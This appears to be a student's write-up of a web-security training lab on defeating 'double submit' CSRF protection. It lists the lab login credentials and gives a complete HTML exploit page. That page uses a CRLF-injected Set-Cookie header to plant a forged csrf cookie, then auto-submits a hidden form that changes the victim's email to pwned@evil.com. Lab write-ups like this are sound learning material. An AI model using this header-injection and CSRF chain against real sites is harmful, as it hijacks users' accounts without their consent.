# Lab: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

![image.png](Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/image.png)

![image.png](Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/image%201.png)

![image.png](Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie/image%202.png)

```html
<html>
  <body>
    <!-- Form to change victim's email -->
    <form action="https://0ac000ba03ecb0c78196616b003c0011.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>

    <!-- Inject fake csrf cookie + auto-submit on error/load -->
    <img src="https://0ac000ba03ecb0c78196616b003c0011.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake;%20SameSite=None"
         onerror="document.forms[0].submit()" />
  </body>
</html>
```